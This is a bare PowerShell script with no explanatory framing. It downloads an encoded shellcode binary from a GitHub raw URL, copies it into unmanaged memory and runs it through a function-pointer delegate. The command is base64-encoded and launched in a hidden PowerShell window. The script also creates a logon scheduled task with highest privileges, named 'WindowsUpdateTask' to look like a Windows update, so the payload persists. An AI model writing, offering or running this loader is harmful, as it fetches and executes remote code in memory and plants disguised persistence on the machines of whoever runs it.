$url = "https://github.com/bobo22e/bobo/raw/refs/heads/main/agent-windows-amd64-0e8c5426.bin.sgn"

# Encode the shellcode execution command
$innerCmd = "`$c=(New-Object Net.WebClient).DownloadData('$url');`$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(`$c.Length);[System.Runtime.InteropServices.Marshal]::Copy(`$c,0,`$m,`$c.Length);[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`$m,[System.Action]).Invoke()"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($innerCmd))

# Run shellcode in a child PowerShell (this one survives)
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -EncodedCommand $encoded" -WindowStyle Hidden

# Set up persistence for next boot
schtasks /create /tn "WindowsUpdateTask" /tr "powershell -WindowStyle Hidden -EncodedCommand $encoded" /sc onlogon /rl highest /f
